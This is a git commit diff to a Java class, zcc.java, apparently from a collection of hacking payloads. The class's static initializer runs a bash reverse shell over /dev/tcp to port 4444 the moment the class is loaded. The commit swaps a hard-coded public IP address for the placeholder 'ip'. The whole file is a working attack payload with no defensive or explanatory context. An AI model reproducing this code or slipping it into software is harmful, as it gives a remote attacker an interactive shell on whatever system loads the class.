23f1873ef1e33763d5a39761587f8d61ccca6d62
hackersources <99701872+hackersources@users.noreply.github.com>
2023-05-22 15:32:40 +0800

    Update zcc.java

--- zcc.java
+++ zcc.java
@@ -4,7 +4,7 @@ public class zcc{
  static {
  try {
  Runtime rt = Runtime.getRuntime();
- String[] commands = {"/bin/bash","-c","bash -i >& /dev/tcp/111.230.19.80/4444 0>&1"};
+ String[] commands = {"/bin/bash","-c","bash -i >& /dev/tcp/ip/4444 0>&1"};
  Process pc = rt.exec(commands);
  pc.waitFor();
  } catch (Exception e) {
